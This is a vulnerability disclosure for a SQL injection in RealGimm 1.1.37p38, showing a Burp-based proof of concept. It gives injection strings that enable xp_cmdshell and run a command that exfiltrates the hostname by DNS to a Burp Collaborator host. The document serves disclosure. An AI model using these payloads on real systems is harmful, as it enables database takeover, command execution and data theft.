# CVE-ID | RealGimm by GruppoSCAI - SQL Injection

A SQL Injection vunerability was found in RealGimm version 1.1.37p38. This vulnerability eventually lead to full database access and remote command execution via xp_cmdshell. What follows is a description of the steps taken to perform the exploit.

## Proof of Concept
First of all, the application performs an input sanitization operation at front-end level. Therefore, in Burp Proxy, disable the Javascript validation applied by application so that we can insert any malicious character inside the forms.

![Disabling JS in Burp](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/9e0a6646-0ea5-4009-b963-8fdb19c269f8)

After that, we access the function in which the vulnerability is present by clicking on *Sistema ->  Scheduler -> Log ObjectTrace* and we insert a single quote inside the "Data Richiesta Dal" field:

![Single quote insertion](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/a4466e0a-3750-4c93-98b3-de061b4d4488)


After starting the search by pressing the magnifying glass icon, we can see that the application returns an error indicating the presence of an error in the syntax of the SQL query used, thus indicating the presence of a SQL Injection vulnerability:

![SQL Error](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/c6e03f6c-ed26-4a5b-954c-4ed65f9ea407)


Below the intercepted requests and responses:

![Request and response 1](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/cbd7fa8c-a351-458f-91a7-2e2249f57ae4)

![Request and response 2](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/b21e04d3-a6aa-42f3-afe5-07b2c2af7e93)


Using sqlmap we therefore obtain the banner together with all the available databases:

![Banner extraction](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/bba5ed73-e4cc-4108-980c-b26121af8d5f)

![Databases extractio](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/b499aa3d-ec54-4720-a068-ef3fed26827c)


Finally, it is possible to achieve code execution on the host where the mssql server is running by enabling and taking advantage of xp_cmdshell. To do this, execute the following instructions one at a time:

```
') EXEC sp_configure 'show advanced options', 1;--

') RECONFIGURE;--

') EXEC sp_configure 'xp_cmdshell', 1;--

') RECONFIGURE;--

')EXEC xp_cmdshell 'for /F "tokens=1" %i in (''hostname'') do nslookup %i.[burp_collaborator_URL].oastify.com';--

```

![Remote code execution](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/baeb01de-f523-4995-834c-f47df297b336)


As seen above, it is possible run any command on the underlaying host and exfiltrate data via the DNS protocol.
